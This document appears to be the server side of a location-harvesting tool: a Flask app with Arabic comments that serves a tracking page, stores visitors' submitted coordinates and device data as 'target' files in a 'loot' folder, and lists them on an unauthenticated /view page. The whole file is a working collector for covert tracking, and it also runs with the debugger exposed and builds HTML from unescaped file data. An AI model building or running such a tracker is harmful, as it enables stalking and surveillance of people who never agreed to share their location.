from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import json, os, datetime

app = Flask(__name__)
CORS(app)

LOOT_DIR = "loot"
os.makedirs(LOOT_DIR, exist_ok=True)

@app.after_request
def add_security_headers(response):
    # السماح بطلب الموقع الجغرافي من نفس النطاق
    response.headers['Permissions-Policy'] = 'geolocation=(self), microphone=(), camera=()'
    # منع تحميل الصفحة داخل frame (حماية ضد clickjacking)
    response.headers['X-Frame-Options'] = 'DENY'
    return response

@app.route('/')
def index():
    return render_template('track.html')

@app.route('/log', methods=['POST'])
def log_location():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{LOOT_DIR}/target_{timestamp}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    print(f"[!] بيانات جديدة مسجلة: {filename}")
    return jsonify({"status": "success"})

@app.route('/view')
def view_loot():
    files = sorted(os.listdir(LOOT_DIR), reverse=True)
    loot_list = ""
    for f in files[:20]:
        with open(os.path.join(LOOT_DIR, f)) as jf:
            data = json.load(jf)
            loot_list += f"<li><b>{f}</b>: "
            if 'latitude' in data:
                loot_list += f"{data['latitude']}, {data['longitude']}"
            else:
                loot_list += "بيانات الجهاز"
            loot_list += f" - {data.get('timestamp','?')}</li>"
    return f"<h2>سجل البيانات المجمعة</h2><ul>{loot_list}</ul>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
